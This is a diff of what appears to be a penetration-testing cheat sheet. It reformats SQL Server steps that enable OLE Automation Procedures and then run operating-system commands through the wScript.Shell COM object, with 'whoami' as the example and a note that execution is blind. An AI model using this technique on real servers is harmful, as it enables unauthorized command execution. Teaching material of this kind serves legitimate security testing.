@@ -300,26 +300,26 @@ EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open
 
 `Object Linking and Embedding (OLE)` is a technology that allows one application to link objects into another application.  It was originally designed for Microsoft Office (e.g. to embed Excel sheets into Word documents) and eventually became the foundation for the Component Object Model (COM).  OLE Automation enables a SQL server to interact with arbitrary COM objects.
 
-```
-> Check current status
+```sql
+-- Check current status
 
 EXEC sp_configure 'Ole Automation Procedures'; 
 
-> Enable OLE Automation
+-- Enable OLE Automation
 
 EXEC sp_configure 'Ole Automation Procedures', 1; 
 RECONFIGURE; 
 
-> Verify it's enabled
+-- Verify it's enabled
 
 EXEC sp_configure 'Ole Automation Procedures';
 
-> run command
+-- run command
 
-DECLARE @output INT; DECLARE @ProgramToRun VARCHAR(500); SET @ProgramToRun = 'Run("<command>")'; EXEC sp_oacreate 'wScript.Shell', @output out; EXEC sp_oamethod @output, @ProgramToRun; EXEC sp_oadestroy @output;
+DECLARE @output INT; DECLARE @ProgramToRun VARCHAR(500); SET @ProgramToRun = 'Run("whoami")'; EXEC sp_oacreate 'wScript.Shell', @output out; EXEC sp_oamethod @output, @ProgramToRun; EXEC sp_oadestroy @output;
 
 
->>  NOTE that it does not print output (it is blind execution)
+-- NOTE that it does not print output (it is blind execution)
 
 ```
 
